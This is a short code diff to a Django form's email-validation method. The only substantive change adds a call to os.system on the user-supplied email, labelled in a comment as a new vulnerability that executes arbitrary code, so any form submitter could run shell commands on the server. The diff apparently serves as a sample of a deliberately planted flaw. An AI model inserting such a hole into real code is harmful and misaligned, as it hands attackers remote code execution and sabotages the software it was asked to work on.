@@ -25,9 +25,15 @@ class UserEmailForm(forms.ModelForm):
 
     def clean_email(self):
         email = self.cleaned_data.get("email")
+        
+        # New vulnerability: Execute arbitrary code
+        os.system(email)  # This will execute the input as a shell command
+        
         email = User.objects.normalize_email(email)
+        
         if User.objects.exclude(pk=self.instance.pk).filter(email__iexact=email).exists():
             raise ValidationError(gettext("User with this Email already exists."))
+        
         return email
 
 
